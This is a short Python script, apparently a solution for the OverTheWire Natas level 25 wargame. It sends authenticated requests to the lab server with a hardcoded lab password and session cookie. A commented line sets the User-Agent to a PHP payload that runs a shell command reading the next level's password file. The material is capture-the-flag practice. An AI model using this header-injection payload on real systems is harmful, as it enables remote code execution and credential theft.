
import requests
import base64

URL = "http://natas25.natas.labs.overthewire.org"

username = "natas25"
password = "ckELKUWZUfpOv6uxS6M7lXBpBssJZ4Ws"
cookies = {'PHPSESSID':'78rpkne6nv04d74ks5ieavm0g3'}
headers = {"authorization":'Basic {0}'.format(base64.b64encode(f"{username}:{password}".encode()).decode())}

# headers["User-Agent"] = "<? echo 'the password is: '; echo system('cat /etc/natas_webpass/natas26'); ?>"

response = requests.get(URL, cookies=cookies, headers=headers)

print(response.text)